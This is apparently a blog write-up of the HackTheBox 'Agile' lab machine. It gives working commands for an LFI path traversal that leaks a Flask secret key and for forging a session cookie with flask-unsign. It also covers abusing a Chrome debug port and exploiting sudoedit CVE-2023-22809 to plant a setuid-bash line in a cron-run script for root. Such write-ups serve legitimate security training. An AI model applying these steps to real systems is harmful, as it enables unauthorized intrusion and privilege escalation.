---
layout: single
title: Agile hackthebox writeup
excerpt: "Medium linux machine in which we get LFI forge our own flask token, exploit Chrome in debug mode and use a sudo CVE to privesc"
date: 2023-04-07
classes: wide
header:
  teaser: /assets/images/agile/agile_icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - hackthebox
  - cron
  - LFI
  - flask
---

![](/assets/images/agile/agile.png)

## User Flag

**Machine has been patched user flag is no longer obtainable this way**

```shell
$ nmap -sS -n -Pn -p- -vv -min-rate 5000 -oN allports 10.10.11.203
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

As usual a webpage. In this case, it's called `superpass.htb` so you need to add it to your `/etc/hosts`. The web is a password manager. We can export our passwords as a csv file, If we intercept with burpsuite we can see it is going to

```http
GET /download?fn=something.csv
```

This part is vulnerable to LFI. Also when a file doesn't exist it gives out an error with quite some verbosity that lets us expose the source code.

```http
GET /download?fn=../app/app/superpass/app.py
```

exposing this file we get the secret key so we can forge our own cookie.
```shell
$ flask-unsign --decode --cookie '.eJwlzj0OwjAMQOG7ZGZI_Bv3MlWc2IK1pRPi7lRiftLT9yl7HnE-y_Y-rniU_bXKVix8KQxiAwtoDKrKiKGynAgpW-dFxmmIZt3cxhCx6cNd67Sqc8moc4xkS7lTnc2DubmSwuqQAvewkifPoN61OgKIZW2BUG7Idcbx1zQs3x-Sti5F.ZC_nKA.3UgNbfeZ1I2p6znKK9gH_Rl6WOo'
{'_fresh': True, '_id': '9ebd72a45929e2152777533e76db4434f185d495f9339989b9aa669cbabb70c907cd6a0caaf59f66690c1be551b7472d82f6253304bf5ce48870b32269f01e32', '_user_id': '13'}
$ flask-unsign --sign --cookie "{'_fresh': True, '_id': '9ebd72a45929e2152777533e76db4434f185d495f9339989b9aa669cbabb70c907cd6a0caaf59f66690c1be551b7472d82f6253304bf5ce48870b32269f01e32', '_user_id': '1'}" --secret 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'
.eJwlzj0KwzAMQOG7eO4g68eycplg2RLtmjRT6d0b6Pzg8X3Knkecz7K9jyseZX-tshULX4qDxdACq6CqClFoW85MnLXLYpM0IrNubmO0ZtOHu8I00LnagDlGimW7E8zqIVJdWXF1zIb3ENhTZnDvCk6IzRJqEJYbcp1x_DW1fH9kqi4S.ZC_1kw.a6k3_78zSoDjIeqVEawowX6oKMI
```

with this we get corum's password.

```shell
$ ssh corum@superpass.htb
```

## Root flag

First, we escalate to user edwars. By executing linpeas we can see that Chrome is in debugging mode on port 41829. So we make an ssh tunnel and with a Chrome-based browser open (in my case brave) `brave://inspect/#devices` in the configuration we enable port forwarding a then the web will appear, we click inspect. Now we are logged in as edwards in a superpass test version we can get his password.

```shell
edwards@agile:/home/corum$ sudo -l
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt

edwards@agile:/home/corum$ sudoedit --version
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

This sudo version is vulnerable to CVE-2023-22809. That makes editing any file as dev_admin possible. If we also execute pspy we can see that `/app/venv/bin` is being executed by a cron job to make changes to the testing app. So if we edit `/app/venv/bin/activate` (which activates the venv) we can get root. The exploit can be used like

```shell
edwards@agile:/app/venv/bin$ EDITOR='vim -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json
```

Then we can edit `/app/venv/bin/activate`, just add `chmod u+s /bin/bash` and wait until the cron job is executed.

```shell
edwards@agile:/app/venv/bin$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
edwards@agile:/app/venv/bin$ bash -p
edwards@agile:/app/venv/bin# whoami
root
```
